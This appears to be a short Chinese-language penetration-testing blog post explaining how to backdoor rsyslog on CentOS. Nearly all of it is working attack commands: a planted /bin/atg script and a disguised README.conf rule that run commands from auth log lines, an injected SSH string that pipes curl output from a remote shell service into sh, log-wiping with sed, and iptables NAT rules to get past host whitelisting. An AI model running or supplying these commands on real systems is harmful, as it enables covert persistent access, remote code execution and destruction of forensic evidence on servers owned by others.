Title: Rsyslog Backdoor
Category: Pentest
Date: 2019-07-21
Slug: rsyslog-backdoor


Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。

###建立

```
echo -e '#!/bin/sh\nsh -c "$1"'>/bin/atg
chmod 755 /bin/atg

echo "auth.*,regex, abcd  ^/bin/atg" > /etc/rsyslog.d/README.conf

重启生效(Centos用下面的systemctl):
/etc/init.d/rsyslog restart
systemctl restart rsyslog

```

###利用:

```
echo "xxxxx';curl https://shell.now.sh/127.0.0.1:1337 | sh;'"|socat STDIO TCP4:127.0.0.1:22
```

###擦屁股:

```
sed -i '/xxxxx/d' /var/log/secure
kill -9 $$ 
```

###注意事项

如果主机设定了`hosts.allow`的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)

```
iptables -t nat -A INPUT -p tcp -d <受害主机> --dport 22 -s <攻击主机> -j SNAT --to-source <ip白名单的地址>
```

然后呢，iptables得开机启动，并且加载这个规则:

```
systemctl disable firewalld  //在centos7 上面防火墙改成这个了
yum install iptables-services   // 以防万一
systemctl enable iptables
systemctl start iptables    //启动
systemctl status iptables  //查看状态
service iptables save   //设定好规则之后，重启也会生效。
```




* <https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/>